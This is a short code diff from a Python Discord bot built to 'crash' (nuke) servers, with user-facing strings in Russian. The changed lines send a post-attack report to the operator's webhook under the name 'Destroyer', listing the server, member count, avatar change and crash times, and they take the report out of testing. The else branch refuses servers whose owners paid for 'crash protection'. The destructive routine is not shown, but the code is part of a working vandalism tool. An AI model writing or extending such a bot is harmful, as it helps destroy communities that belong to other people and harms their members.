@@ -145,16 +145,16 @@ async def call(ctx):
 		await asyncio.sleep(2)
 	#CRASH REPORT
 		try:
-			emb = Embed(title = 'Новый краш!(testing)', description = f"Сервер: {servername}\nУчастников: {start_guild_num}\n\
+			emb = Embed(title = 'Новый краш!', description = f"Сервер: {servername}\nУчастников: {start_guild_num}\n\
 			  Аватарка изменена?: {pfp_ch}\n\n\
 			Начало краша: {start_time}\n\
 			Конец краша: {end_time}\n\nНе добавляйте подозрительных ботов и следите за правом управления сервером :)", color = 0xe01337, timestamp='now')
 			emb.set_footer('Сервер крашнут')
 			emb.set_thumbnail(url = servericon)
-			webhook.send(embed = emb, username = 'test')
+			webhook.send(embed = emb, username = 'Destroyer')
 			print(f'Crash ended. Webhook - succes\n{start_time} - {end_time}')
-		except:
-			print()
+		except Exception as e:
+			print(e)
 	else:
 		await ctx.send(f'Извини, но сервер нельзя крашить, т.к. владелец купил защиту от краша. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')
 
